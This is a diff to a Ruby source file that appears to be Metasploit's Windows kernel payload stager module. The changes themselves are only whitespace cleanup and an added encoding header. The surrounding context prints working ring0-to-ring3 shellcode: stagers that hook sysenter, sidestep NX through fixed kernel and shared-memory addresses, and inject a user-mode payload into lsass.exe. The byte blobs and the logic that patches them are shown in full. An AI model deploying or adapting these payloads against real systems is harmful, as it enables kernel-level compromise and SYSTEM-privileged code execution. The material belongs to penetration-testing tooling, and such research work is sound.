@@ -1,3 +1,4 @@
+# -*- coding: binary -*-
 module Rex
 module Payloads
 module Win32
@@ -10,7 +11,7 @@ module Kernel
 # indirectly.
 #
 module Stager
-	
+
 	#
 	# Works on Vista, Server 2008 and 7.
 	#
@@ -28,23 +29,23 @@ module Stager
 	# * If the ring3 stager is executing in the desired process our sysenter handler is removed and the real ring3 payload called.
 	#
 	def self.stager_sysenter_hook( opts = {} )
-		
+
 		# The page table entry for StagerAddressUser, used to bypass NX in ring3 on PAE enabled systems (should be static).
 		pagetable = opts['StagerAddressPageTable'] || 0xC03FFF00
-		
+
 		# The address in kernel memory where we place our ring0 and ring3 stager (no ASLR).
 		kstager   = opts['StagerAddressKernel'] || 0xFFDF0400
-		
+
 		# The address in shared memory (addressable from ring3) where we can find our ring3 stager (no ASLR).
 		ustager   = opts['StagerAddressUser'] || 0x7FFE0400
-		
+
 		# Target SYSTEM process to inject ring3 payload into.
 		process   = (opts['RunInWin32Process'] || 'lsass.exe').unpack('C*')
-		
+
 		# A simple hash of the process name based on the first 4 wide chars.
 		# Assumes process is located at '*:\windows\system32\'.
 		checksum  = process[0] + ( process[2] << 8 )  + ( process[1] << 16 ) + ( process[3] << 24 )
-		
+
 		# The ring0 -> ring3 payload blob.
 		r0 =	"\xFC\xFA\xEB\x1E\x5E\x68\x76\x01\x00\x00\x59\x0F\x32\x89\x46\x60" +
 				"\x8B\x7E\x64\x89\xF8\x0F\x30\xB9\x41\x41\x41\x41\xF3\xA4\xFB\xF4" +
@@ -59,23 +60,23 @@ module Stager
 				"\x8B\x43\x10\x8B\x40\x3C\x83\xC0\x28\x8B\x08\x03\x48\x03\x81\xF9" +
 				"\x44\x44\x44\x44\x75\x18\xE8\x0A\x00\x00\x00\xE8\x10\x00\x00\x00" +
 				"\xE9\x09\x00\x00\x00\xB9\xDE\xC0\xAD\xDE\x89\xE2\x0F\x34\x61\xC3"
-		
+
 		# The ring3 payload.
 		r3  = ''
 		r3 += _createthread() if opts['CreateThread'] == true
 		r3 += opts['UserModeStub'] || ''
-		
+
 		# Patch in the required values.
 		r0 = r0.gsub( [ 0x41414141 ].pack("V"), [ ( r0.length + r3.length - 0x1C ) ].pack("V") )
 		r0 = r0.gsub( [ 0x42424242 ].pack("V"), [ kstager ].pack("V") )
 		r0 = r0.gsub( [ 0x43434343 ].pack("V"), [ ustager ].pack("V") )
 		r0 = r0.gsub( [ 0x44444444 ].pack("V"), [ checksum ].pack("V") )
 		r0 = r0.gsub( [ 0x45454545 ].pack("V"), [ pagetable ].pack("V") )
-		
+
 		# Return the ring0 -> ring3 payload blob with the real ring3 payload appended.
 		return r0 + r3
 	end
-	
+
 	#
 	# XP SP2/2K3 SP1 ONLY
 	#
@@ -92,7 +93,7 @@ module Stager
 		r3_payload  = opts['UserModeStub'] || ''
 		r3_prefix   = _run_only_in_win32proc_stub("\xff\x25\x08\x03\xfe\x7f", opts)
 		r3_size     = ((r3_prefix.length + r3_payload.length + 3) & ~0x3) / 4
-		
+
 		r0_stager =
 			"\xEB" + [0x22 + r0_recovery.length].pack('C') + # jmp short 0x27
 			"\xBB\x01\x03\xDF\xFF"                         + # mov ebx,0xffdf0301
@@ -105,7 +106,7 @@ module Stager
 			"\xF3\xA5"                                     + # rep movsd
 			"\xBF\x7C\x03\xFE\x7F"                         + # mov edi,0x7ffe037c
 			"\x39\x3B"                                     + # cmp [ebx],edi
-			"\x74\x09"                                     + # jz 
+			"\x74\x09"                                     + # jz
 			"\x8B\x03"                                     + # mov eax,[ebx]
 			"\x8D\x4B\x08"                                 + # lea ecx,[ebx+0x8]
 			"\x89\x01"                                     + # mov [ecx],eax
@@ -119,10 +120,10 @@ module Stager
 	end
 
 protected
-	
-	# 
+
+	#
 	# Stub to run a prepended ring3 payload in a new thread.
-	# 
+	#
 	# Full assembly source at:
 	# /msf3/external/source/shellcode/windows/x86/src/single/createthread.asm
 	#
@@ -140,7 +141,7 @@ protected
 				"\x68\x0D\x16\xFF\xD5\xC3\x58"
 		return r3
 	end
-	
+
 	#
 	# This stub is used by stagers to check to see if the code is
 	# running in the context of a user-mode system process.  By default,
@@ -150,11 +151,11 @@ protected
 	# stub also makes sure that the payload does not run more than
 	# once.
 	#
-	def self._run_only_in_win32proc_stub(append = '', opts = {}) 
+	def self._run_only_in_win32proc_stub(append = '', opts = {})
 		opts['RunInWin32Process'] = "lsass.exe" if opts['RunInWin32Process'].nil?
 
 		process  = opts['RunInWin32Process'].downcase
-		checksum = 
+		checksum =
 			process[0]         +
 			(process[2] << 8)  +
 			(process[1] << 16) +
